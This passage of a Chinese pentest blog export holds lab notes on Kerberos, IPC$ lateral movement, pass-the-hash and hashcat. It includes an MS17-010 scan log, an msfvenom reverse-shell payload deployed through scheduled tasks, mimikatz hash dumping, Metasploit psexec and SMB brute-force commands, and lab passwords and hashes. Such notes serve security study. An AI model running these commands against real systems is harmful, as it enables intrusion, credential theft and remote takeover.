CHECK_PIPE   false                  no        Check for named pipe on vulnerable</span><br><span class="line">                                                  hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit  yes       List of named pipes to check</span><br><span class="line">                -framework/data/wordl</span><br><span class="line">                ists/named_pipes.txt</span><br><span class="line">   RHOSTS       192.168.52.0/24        yes       The target host(s), range CIDR ide</span><br><span class="line">                                                 ntifier, or hosts file with syntax</span><br><span class="line">                                                  &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        445                    yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                      no        The Windows domain to use for auth</span><br><span class="line">                                                 entication</span><br><span class="line">   SMBPass                             no        The password for the specified use</span><br><span class="line">                                                 rname</span><br><span class="line">   SMBUser                             no        The username to authenticate as</span><br><span class="line">   THREADS      100                    yes       The number of concurrent threads (</span><br><span class="line">                                                 max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.52.0/24</span><br><span class="line">rhosts =&gt; 192.168.52.0/24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 500</span><br><span class="line">threads =&gt; 500</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  45 of 256 hosts (17% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  52 of 256 hosts (20% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  77 of 256 hosts (30% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 114 of 256 hosts (44% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 145 of 256 hosts (56% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[-] 192.168.52.141:445    - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 190 of 256 hosts (74% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 255 of 256 hosts (99% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用ms17_010_command</p>
<p> <code>use auxiliary/admin/smb/ms17_010_command</code>，但是都利用失败了……</p>
<p><img src="/posts/bb76ba56/ms17_010_error.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberos协议分析</title>
    <url>/posts/e9f6bf8b/</url>
    <content><![CDATA[<h3 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h3><ul>
<li>Client</li>
<li>Server</li>
<li>KDC<ul>
<li>AD：存储所有Client的白名单，用于验证Client身份</li>
<li>AS：为Client生成TGT 服务</li>
<li>TGS：为Client生成某个服务的Ticket</li>
</ul>
</li>
</ul>
<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>AS：身份认证服务，用于验证Client身份</p>
<p>KDC：密钥分发中心</p>
<p>TGT：票据中心，访问TGS的票据</p>
<p>TGS：票据授权服务</p>
<p>ST：访问Server的票据</p>
<p>SessionKey：临时会话密钥a，AS生成发送给客户端(随机密钥)</p>
<p>ServerSessionKey：临时会话密钥b，TGS生成发送给客户端(随机密钥)</p>
<h3 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h3><h4 id="Client-向KDC-AS申请TGT"><a href="#Client-向KDC-AS申请TGT" class="headerlink" title="Client 向KDC-AS申请TGT"></a>Client 向KDC-AS申请TGT</h4><h5 id="Client-gt-KDC-AS-AS-REQ"><a href="#Client-gt-KDC-AS-AS-REQ" class="headerlink" title="Client -&gt; KDC-AS (AS_REQ)"></a>Client -&gt; KDC-AS (AS_REQ)</h5><p>发送AS_REQ：(被Client加密的时间戳, 客户端信息, 服务器端信息)</p>
<p>KDC-AS进行认证 看是否在白名单中</p>
<h5 id="KDC-AS-gt-Client-AS-REP"><a href="#KDC-AS-gt-Client-AS-REP" class="headerlink" title="KDC-AS -&gt; Client(AS_REP)"></a>KDC-AS -&gt; Client(AS_REP)</h5><p>如果认证通过，AS会随机生成一个字符串 <strong>Sessionkey</strong></p>
<p>发送两条消息</p>
<p>T(C)   Client Pass Hash(SessionKey)  ,用于后续与TGS服务通信</p>
<pre><code>发送 SessionKey 
</code></pre>
<p>TGT   KDC Pass Hash(SessionKey, Client信息) ，作为向TGS申请票据的凭证</p>
<pre><code>发送 SessionKey Client信息 结束时间
</code></pre>
<h4 id="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"><a href="#Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket" class="headerlink" title="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"></a>Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket</h4><h5 id="Client-gt-KDC-TGS-TGS-REQ"><a href="#Client-gt-KDC-TGS-TGS-REQ" class="headerlink" title="Client -&gt; KDC-TGS (TGS_REQ)"></a>Client -&gt; KDC-TGS (TGS_REQ)</h5><p>客户端使用NTLM Hash解密T(C) 得到<strong>SessionKey</strong></p>
<p>Client 向 TGS 发送消息</p>
<pre><code>TGT

SessionKey(Client信息,时间戳) 可以记作认证因子，使用SessionKey进行加密

Client信息

Server信息
</code></pre>
<h5 id="KDC-TGS-gt-Client-TGS-REP"><a href="#KDC-TGS-gt-Client-TGS-REP" class="headerlink" title="KDC-TGS -&gt; Client(TGS_REP)"></a>KDC-TGS -&gt; Client(TGS_REP)</h5><p>KDC使用NTLMHash解密 TGT 得到 (SessionKey，Client信息，结束时间)</p>
<p>然后使用SessionKey解密 认证因子 得到(Client信息，时间戳)</p>
<p>校验 时间戳与当前时间 和解密TGT后的Client信息与SessionKey解密后的Client信息</p>
<p>校验通过后，会判断客户端有没有权限访问服务端    </p>
<p>认证通过后，KDC 会生成ServerSessionKey(随机生成)</p>
<p>发送RGS_REP:</p>
<p>SessionKey(ServerSessionKey, Client信息，票据到期时间)  （使用SessionKey加密的ServerSessionKey ）</p>
<p>ST (ServerSessionKey, 客户信息 ，票据到期时间)  </p>
<p>票据到期时间可以理解成TGS生命周期</p>
<h4 id="Client得到ST后，可以访问server"><a href="#Client得到ST后，可以访问server" class="headerlink" title="Client得到ST后，可以访问server"></a>Client得到ST后，可以访问server</h4><p>Client 收到信息后，使⽤Session Key解密获得 (ServerSessionKey, Client信息，TGS生命周期）</p>
<h5 id="Client-gt-Server-AP-REQ"><a href="#Client-gt-Server-AP-REQ" class="headerlink" title="Client -&gt; Server (AP-REQ)"></a>Client -&gt; Server (AP-REQ)</h5><p>发送AP-REQ:</p>
<pre><code>ST

ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用ServerSessionKey加密
</code></pre>
<h5 id="Server-gt-Client-AP-REP"><a href="#Server-gt-Client-AP-REP" class="headerlink" title="Server -&gt; Client(AP-REP)"></a>Server -&gt; Client(AP-REP)</h5><p>Server使用NTLM Hash解密ST 得到 (ServerSessionKey,  Client信息，票据到期时间)</p>
<p>用ServerSessionKey解密认证因子2 得到 (Client信息，票据到期时间)</p>
<p>然后再校验时间戳和Client信息</p>
<p>校验通过后，客户端即可访问服务端</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>常用Windows远程连接和相关命令</title>
    <url>/posts/9527b68a/</url>
    <content><![CDATA[<h3 id="IPC-共享连接"><a href="#IPC-共享连接" class="headerlink" title="IPC$共享连接"></a>IPC$共享连接</h3><p>IPC$ （Internet Process Connection) 共享”命名管道”的资源，为实现进程间通信而开放的通道。使用该命令可以与目标主机建立连接，建立连接后可以访问目标主机的文件，进行下载、上传、命令执行等操作。</p>
<br>

<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>目标主机开启139，445端口</li>
<li>目标主机管理员开启<code>IPC$</code>默认共享服务</li>
<li>知道目标主机的账号密码</li>
</ul>
<br>

<h4 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h4><h5 id="查看Windows默认开启的共享"><a href="#查看Windows默认开启的共享" class="headerlink" title="查看Windows默认开启的共享"></a>查看Windows默认开启的共享</h5><p><code>net share</code> </p>
<h5 id="查看当前主机所建立的连接"><a href="#查看当前主机所建立的连接" class="headerlink" title="查看当前主机所建立的连接"></a>查看当前主机所建立的连接</h5><p><code>net use</code></p>
<h4 id="确定主机时间"><a href="#确定主机时间" class="headerlink" title="确定主机时间"></a>确定主机时间</h4><p><code>net time \\ip </code></p>
<h4 id="开启-关闭IPC-共享"><a href="#开启-关闭IPC-共享" class="headerlink" title="开启/关闭IPC$共享"></a>开启/关闭IPC$共享</h4><p><code>net share ipc$</code> </p>
<p><code>net share ipc$ /del</code></p>
<h5 id="建立空连接"><a href="#建立空连接" class="headerlink" title="建立空连接"></a>建立空连接</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
<h5 id="建立完整的用户名-密码IPC-连接"><a href="#建立完整的用户名-密码IPC-连接" class="headerlink" title="建立完整的用户名 密码IPC$连接"></a>建立完整的用户名 密码IPC$连接</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
<h5 id="删除IPC-连接"><a href="#删除IPC-连接" class="headerlink" title="删除IPC$连接"></a>删除IPC$连接</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
<h5 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> 把目标主机的c盘映射到本地主机的z盘(没有建立ipc连接情况下)</p>
<p><code>net use z: \\10.10.0.164\c$</code>（已经建立ipc连接的情况下）</p>
<p><img src="/posts/9527b68a/yingshe.png"></p>
<h5 id="删除映射的z盘"><a href="#删除映射的z盘" class="headerlink" title="删除映射的z盘"></a>删除映射的z盘</h5><p><code>net use z: /del </code></p>
<h5 id="删除全部"><a href="#删除全部" class="headerlink" title="删除全部"></a>删除全部</h5><p><code>net use * /del</code></p>
<h5 id="使用dir查看目标机器目录"><a href="#使用dir查看目标机器目录" class="headerlink" title="使用dir查看目标机器目录"></a>使用dir查看目标机器目录</h5><p><code>dir \\10.10.0.164\c$</code></p>
<p><img src="/posts/9527b68a/dir.png"></p>
<h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><p><code>copy test.txt \\10.10.0.164\c$</code> 将test.txt复制到目标主机的c盘</p>
<h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
<h4 id="使用at命令创建计划任务"><a href="#使用at命令创建计划任务" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h4><p><code>at \\&lt;目标主机ip&gt; &lt;启动时间&gt; &lt;木马所在位置&gt;</code></p>
<p><code>at \\10.10.0.164  </code></p>
<p>删除id为1的计划任务</p>
<p><code>at \\10.10.0.164 1 /delete</code></p>
<h4 id="使用type读取文件"><a href="#使用type读取文件" class="headerlink" title="使用type读取文件"></a>使用type读取文件</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  读取目标机器的1.txt文件</p>
<br>

<br>

<h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>win7  攻击机  </p>
<p>win2012 目标机   10.10.0.164</p>
<br>

<p>使用win7与目标机建立ipc连接</p>
<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
<p>查看目标机器的时间</p>
<p><code>net time \\10.10.0.164 </code></p>
<p>使用dir读取目标机器c盘的文件</p>
<p><code>dir \\10.10.0.164\c$ </code></p>
<p>使用type读取目标主机c盘下的1.txt</p>
<p><code>type \\10.10.0.164\c$\1.txt</code></p>
<p>选择将目标主机的c盘映射到本地z盘</p>
<p><code>net use z: \\10.10.0.164\c$ </code></p>
<p>在建立ipc连接后利用Psexec反弹cmd</p>
<p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
<p>删除映射的z盘</p>
<p><code>net use z: /del </code></p>
<p>删除ipc$连接</p>
<p><code>net use \\10.10.0.164\ipc$ /del</code></p>
<p>删除全部</p>
<p><code>net use * /del </code></p>
<br>

<h3 id="IPC-计划任务进行横向渗透"><a href="#IPC-计划任务进行横向渗透" class="headerlink" title="IPC+计划任务进行横向渗透"></a>IPC+计划任务进行横向渗透</h3><h4 id="使用schtasks命令"><a href="#使用schtasks命令" class="headerlink" title="使用schtasks命令"></a>使用schtasks命令</h4><p>利用流程</p>
<ol>
<li>与目标建立IPC连接</li>
<li>使用copy命令将木马、命令脚本复制到目标机器</li>
<li>目标机器创建计划任务，使其自动触发木马、脚本</li>
<li>删除IPC连接</li>
</ol>
<p>环境</p>
<pre><code>攻击机  192.168.0.128 (kali)

目标机  192.168.0.164 (Win2012）

跳板机  192.168.0.157 (WIn2008)
</code></pre>
<br>

<h5 id="跳板机与目标机建立IPC连接"><a href="#跳板机与目标机建立IPC连接" class="headerlink" title="跳板机与目标机建立IPC连接"></a>跳板机与目标机建立IPC连接</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
<h5 id="kali上生成木马"><a href="#kali上生成木马" class="headerlink" title="kali上生成木马"></a>kali上生成木马</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
<h4 id="将shell-exe传到跳转机上"><a href="#将shell-exe传到跳转机上" class="headerlink" title="将shell.exe传到跳转机上"></a>将shell.exe传到跳转机上</h4><p>在kali上开启一个http服务</p>
<p><code>python3 -m http.server 9999</code></p>
<p>在跳转机上访问并下载shell.exe</p>
<h5 id="在跳转机上使用copy命令将shell-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell.exe复制到目标机"></a>在跳转机上使用copy命令将shell.exe复制到目标机</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir.png"></p>
<h5 id="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe"><a href="#利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe" class="headerlink" title="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe"></a>利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
<p><img src="/posts/9527b68a/schtasks1.png"></p>
<p>使用nc监听win2008跳转机的8888端口</p>
<p><img src="/posts/9527b68a/schtasks_nc.png"></p>
<h5 id="利用schtasks-执行命令，使用type读取文件内容"><a href="#利用schtasks-执行命令，使用type读取文件内容" class="headerlink" title="利用schtasks 执行命令，使用type读取文件内容"></a>利用schtasks 执行命令，使用type读取文件内容</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
<p><img src="/posts/9527b68a/schtasks2.PNG"></p>
<p>查看是否生成result.txt</p>
<p><code>dir \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir2.png"></p>
<p>查看result.txt的内容</p>
<p><code>type \\192.168.0.164\c$\result.txt</code></p>
<p><img src="/posts/9527b68a/result.png"></p>
<h5 id="schtasks-删除计划任务"><a href="#schtasks-删除计划任务" class="headerlink" title="schtasks 删除计划任务"></a>schtasks 删除计划任务</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
<p><img src="/posts/9527b68a/schtasks_delete.png"></p>
<h5 id="断开ipc-连接"><a href="#断开ipc-连接" class="headerlink" title="断开ipc$连接"></a>断开ipc$连接</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
<h5 id="schtasks-参数"><a href="#schtasks-参数" class="headerlink" title="schtasks 参数"></a>schtasks 参数</h5><blockquote>
<p>S [目标主机]<br>/U [目标用户名]<br>/P [目标密码]<br>/TN [任务名称]<br>/TR [执行程序]<br>/SC [执行方式，once为执行1次]<br>/ST [定时计划执行时间]<br>/f  [默认为Y，不进行回显交互，直接运行]<br>/i  [显示程序窗口交互]</p>
</blockquote>
<h4 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h4><p>at命令和schtasks命令类似</p>
<p>注意: Windows Server 2012 以后的版本没有at命令，只有schtasks命令<br>所以在这里使用win7 代替之前使用的win2012<br>环境<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
<h5 id="与建立目标机器建立IPC连接"><a href="#与建立目标机器建立IPC连接" class="headerlink" title="与建立目标机器建立IPC连接"></a>与建立目标机器建立IPC连接</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
<h5 id="在跳转机上使用copy命令将shell2-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell2-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell2.exe复制到目标机"></a>在跳转机上使用copy命令将shell2.exe复制到目标机</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
<h5 id="使用at命令创建计划任务-1"><a href="#使用at命令创建计划任务-1" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h5><p>查看目标机器时间</p>
<p><code>net time \\192.168.0.157 </code> 这里的时间可能与本地不符合</p>
<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
<p><img src="/posts/9527b68a/at_shell2.png"></p>
<h5 id="查看任务列表"><a href="#查看任务列表" class="headerlink" title="查看任务列表"></a>查看任务列表</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
<p><a href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
<p><a href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashpth</title>
    <url>/posts/350b40a4/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PASS The Hash 也叫Hash传递攻击，简称 PTH。用户登录可以不需要明文密码只需要获取到Hash 就可以登录目标系统。</p>
<p>在域中，用户登录的账号密码大都是相同的，所以攻击者可以通过Hash传递来尝试登录内网的其他计算机.通过使用哈希传递攻击，攻击者不需要破解密码散列值</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在windows系统中，通常会使用NTLM进行身份验证，在使用NTLM做身份验证时，不会使用明文密码作为身份验证，而是使用明文密码加密过的Hash值作为身份验证的凭据。攻击者可以直接通过LM Hash 和NTLM Hash 访问远程主机或服务，而不需要提供明文密码。</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
<li><p>获取一台域主机的高（admin或者system）权限</p>
</li>
<li><p>利用mimikatz等工具导出hash</p>
</li>
<li><p>利用导出的hash尝试登录其他的域内主机</p>
</li>
</ul>
<h3 id="hash-pth攻击"><a href="#hash-pth攻击" class="headerlink" title="hash pth攻击"></a>hash pth攻击</h3><h4 id="使用mimikatz-进行pth"><a href="#使用mimikatz-进行pth" class="headerlink" title="使用mimikatz 进行pth"></a>使用mimikatz 进行pth</h4><p>在Windows Server 2012中打开mimikatz  </p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::msv</code></p>
<p><img src="/posts/350b40a4/msv.png"></p>
<p>得到hash值为  <code>4cb55ea6471d29ccbb2ce4cf00271fe3</code></p>
<p>但是在这里如果选择直接复制mimikatz中的信息的话，程序会直接卡死，所以可以选择开启日志 <code>log</code></p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::pth /user:Administrator /domain:mamor /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></p>
<p><img src="/posts/350b40a4/pth.png"></p>
<p>运行完命令会弹出cmd.exe</p>
<p><img src="/posts/350b40a4/pth2.png"></p>
<p>成功访问到域内的另一台相同密码的机器的C盘</p>
<p><img src="/posts/350b40a4/pth_cmd.png"></p>
<p>对于安装KB2871991补丁后的机器，无法使用常规的哈希传递进行横向移动，但是对于Administrator（SID为500的账号）的散列值仍可以进行哈希传递。也就是说只要SID为500的账号进行横向渗透时不会被该补丁所影响。</p>
<h4 id="利用wmiexec-py进行pth攻击"><a href="#利用wmiexec-py进行pth攻击" class="headerlink" title="利用wmiexec.py进行pth攻击"></a>利用wmiexec.py进行pth攻击</h4><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<br>

<h4 id="使用msf中的模块进行pth攻击"><a href="#使用msf中的模块进行pth攻击" class="headerlink" title="使用msf中的模块进行pth攻击"></a>使用msf中的模块进行pth攻击</h4><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>环境：</p>
<p>Windows2012  192.168.0.161 10.10.0.161</p>
<p>kali  192.168.0.128</p>
<p>条件 ：</p>
<ol>
<li>开启445端口SMB服务（默认开启）</li>
<li>开启admin$共享</li>
</ol>
<p>**<a href="https://asecuritysite.com/encryption/lmhash">https://asecuritysite.com/encryption/lmhash</a> **</p>
<p>可以将密码转换为LM-Hash 和 NTLM-Hash (LMHASH:NTHASH 格式) </p>
<p>利用：</p>
<p>use exploit/windows/smb/psexec<br>set RHOSTS 192.168.0.161<br>set payload windows/meterpreter/reverse_tcp（默认payload）<br>set LPORT 4444<br>set LHOST 192.168.0.128<br>set SMBUSER Administrator<br>set SMBPASS admin123!        （设置密码明文或者hash值 来进行pth）<br>set SMBDomain mamor<br>exploit</p>
<p><img src="/posts/350b40a4/msf_psexec.png"></p>
<h5 id="SMB-pth攻击"><a href="#SMB-pth攻击" class="headerlink" title="SMB pth攻击"></a>SMB pth攻击</h5><p>Metasploit有一个auxiliary辅助模块，可以通过SMB登录到网络中。这个模块需要用户名和hash字典，将收集的用户名和hash制作成了字典，去爆破有效的用户名和hash组合。当然如果有用户名 密码的字典也可以使用此模块进行爆破</p>
<p><code>use auxiliary/scanner/smb/smb_login</code></p>
<p><code>set rhosts 192.168.0.157</code><br><code>set user_file /home/kali/Common/user.txt</code><br><code>set pass_file /home/kali/Common/password.txt</code><br><code>set smbdomain mamor</code><br><code>exploit</code></p>
<p><img src="/posts/350b40a4/smb_pth1.png"></p>
<p><img src="/posts/350b40a4/smb_pth2.png"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2084">http://www.feidao.site/wordpress/?p=2084</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/14507846.html">https://www.cnblogs.com/zzjdbk/p/14507846.html</a></p>
<p><a href="https://yoga7xm.top/2019/04/12/IPentest-domain3/">https://yoga7xm.top/2019/04/12/IPentest-domain3/</a></p>
<p><a href="https://blog.csdn.net/zzlx123/article/details/103595197">https://blog.csdn.net/zzlx123/article/details/103595197</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashcat使用</title>
    <url>/posts/de6bd435/</url>
    <content><![CDATA[<p>Hashcat –help 参看hashcat 帮助文档 </p>
<br>

<p>-m  表示散列算法类型</p>
<p>-m 1000 （NTLM）</p>
<p><img src="/posts/de6bd435/Hash_modes.png"></p>
<p>-a  指定破解模式，常用 straight 字典破解 和 brute-force 暴力破解</p>
<blockquote>
<p>0 = Straight        //字典破解</p>
<p>1 = Combination        //组合破解</p>
<p>3 = Brute-force        //掩码暴力破解</p>
<p>6 = Hybrid Wordlist + Mask        </p>
<p>7 = Hybrid Mask + Wordlist</p>
<p>9 = Association</p>
</blockquote>
<p><img src="/posts/de6bd435/Hash_Attack.png"></p>
<br>

<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>hashcat -a 0 -m xx &lt;hashfile&gt; &lt;zidian1&gt; &lt;zidian2&gt;</code></p>
<blockquote>
<p>-m                           指定哈希类型</p>
<p>-a                            指定破解模式</p>
<p>-V                            查看版本信息</p>
<p>-o                            将输出结果储存到指定文件</p>
<p>–force                     忽略警告</p>
<p>–show                    仅显示破解的hash密码和对应的明文</p>
<p>–remove                 从源文件中删除破解成功的hash</p>
<p>–username             忽略hash表中的用户名</p>
<p>-b                             测试计算机破解速度和相关硬件信息</p>
<p>-O                            限制密码长度</p>
<p>-T                            设置线程数</p>
<p>-r                             使用规则文件</p>
<p>-1                             自定义字符集  -1 0123asd     ?1={0123asd}</p>
<p>-2                             自定义字符集  -2 0123asd    ?2={0123asd}</p>
<p>-3                             自定义字符集  -3 0123asd    ?3={0123asd}</p>
<p>-i                              启用增量破解模式</p>
<p>–increment-min       设置密码最小长度</p>
<p>–increment-max      设置密码最大长度</p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows用户密码加密方法与破解</title>
    <url>/posts/11da9eaf/</url>
    <content><![CDATA[<br>

<h3 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h3><h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>LAN Manager (LM) Hash 时WIndows 系统所用的第一种密码哈希算法，本质为DES加密</p>
<h5 id="LM-Hash-生成原理"><a href="#LM-Hash-生成原理" class="headerlink" title="LM Hash 生成原理"></a>LM Hash 生成原理</h5><ul>
<li><p>1.用户密码转换为大写，最大长度限制为14个字符，</p>
</li>
<li><p>2.密码转换为16进制字符串，不足14个字节将用0来补全</p>
</li>
<li><p>3.密码的16进制被分成两个7byte部分，每部分转换成比特流，并且长度为为56bit，长度不足则在左边用0补齐</p>
</li>
<li><p>4.再分为7bit为一组，每组末尾加0，再组成一组</p>
</li>
<li><p>5.将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串“KGS!@#$% ”进行加密</p>
</li>
</ul>
<br>

<p>参考<a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
<p>以这篇文字给出的 123994 为例</p>
<p>将 123994 使用文本编辑器 转换为十六进制 </p>
<p><img src="/posts/11da9eaf/LM-Hash1.png"></p>
<p>转换后 为 <code>313233393934</code> (12*4 bits) 而为了满足14字节(14 * 8 bits) 后续全都用0补全</p>
<p>所以 补全后的十六进制为 <code>3132333939340000 0000000000000000</code></p>
<p>将以上编码分词2组7字节(7*8 bits)   <code>3132333939340000</code>  <code>0000000000000000</code></p>
<p>将以上两组7字节的十六进制转换为 二进制，每7bit 一组末尾加0，再转换为十六进制组成的两组8字节的编码</p>
<p><code>31323339393400</code> 转换为 二进制位</p>
<p><code>00110001001100100011001100111001001110010011010000000000</code> 长度不足便在左边补0 这里从计算器复制过来没有前面两个0</p>
<p><code>0011000  1001100  1000110  0110011  1001001  1100100  1101000 0000000</code> 每7位分为一组</p>
<p><code>00110000  10011000  10001100  01100110  10010010  11001000  11010000 00000000 </code>  每一组末尾补0</p>
<p>将每一组转换位十六进制</p>
<p><code>00110000  10011000  1000110 001100110  10010010  11001000  11010000 00000000 </code></p>
<p><code>30       98        8C        66        92         C8        D0        00 </code></p>
<p>最终得到 <code>30988C6692C8D000</code>  同理 <code>00000000000000</code> (14个0 ) 得到 <code>0000000000000000</code>(16个0)</p>
<p>最后再将 以上两组8字节编码 分别作为DES 加密的密钥 为 魔术字符串“KGS!@#$% ”进行加密</p>
<p>该魔术字符串转换为16进制为 <code>4B47532140232425</code></p>
<p><img src="/posts/11da9eaf/KGS.png"></p>
<p>将两组DES加密后的编码拼接，<br>得到最终LM-Hash值为：<br>FAE8BB9ECB799902 AAD3B435B51404EE</p>
